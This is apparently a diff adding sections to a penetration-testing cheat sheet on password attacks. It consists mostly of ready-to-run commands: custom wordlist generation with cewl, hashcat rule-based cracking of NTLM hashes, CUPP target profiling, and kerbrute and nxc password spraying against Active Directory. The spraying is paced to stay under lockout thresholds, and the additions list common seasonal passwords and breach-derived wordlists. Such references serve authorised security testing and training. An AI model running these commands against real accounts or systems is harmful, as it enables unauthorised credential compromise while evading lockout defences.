@@ -108,6 +108,53 @@ responder -I eth0 -wd
 hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
 ```
 
+## Custom Wordlist Generation
+
+```bash
+# Site-specific words from target web content
+cewl http://$IP -m 5 -w cewl.txt
+cewl http://$IP -m 5 --with-numbers -w cewl.txt   # include words with numbers
+
+# Username-based password mutation (common enterprise pattern)
+# E.g., target org named "CORP", user "jsmith" → passwords: Corp2024!, Jsmith1, etc.
+
+# Hashcat rules — dramatically expand base wordlist coverage
+hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
+hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+
+# Combine cewl output with rules
+hashcat -m 1000 hashes.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule
+
+# CUPP — Common User Passwords Profiler (generates personalized wordlist)
+cupp -i   # interactive mode — prompts for target info (name, DOB, pet, etc.)
+
+# Mentalist — GUI wordlist builder with pattern-based mutations
+# https://github.com/sc0tfree/mentalist
+```
+
+## Password Spray — Timing & Lockout
+
+```bash
+# ALWAYS check lockout policy before spraying
+nxc smb $DC_IP -u '' -p '' --pass-pol
+nxc smb $DC_IP -u guest -p '' --pass-pol
+
+# Lockout threshold: 5 attempts → spray ≤ 3 passwords, then wait > observation window
+# Typical observation window: 30 minutes
+# Spray cadence: 1 password per 30-60 minutes against 5-attempt lockout
+
+# Track attempts to avoid re-spraying same account
+kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!' 2>&1 | tee spray_1.txt
+# Wait 30+ min
+kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Welcome1!' 2>&1 | tee spray_2.txt
+
+# Seasonal patterns — high-hit passwords by quarter
+# Q1: Company2024!, Company2024$
+# Common: Password1, Welcome1, Summer2024!, Winter2024!
+# On AD: <CompanyName>1, <Season><Year>!
+```
+
 ## Wordlists
 
 | Wordlist | Use |
@@ -115,4 +162,6 @@ hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
 | `/usr/share/wordlists/rockyou.txt` | General purpose |
 | `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Fast spray |
 | `/usr/share/seclists/Passwords/Default-Credentials/` | Default service creds |
+| `/usr/share/seclists/Passwords/Leaked-Databases/` | Breach-derived lists |
 | `cewl http://$IP -m 5 -w cewl.txt` | Site-specific words |
+| `cupp -i` | Target-profiled personalized list |
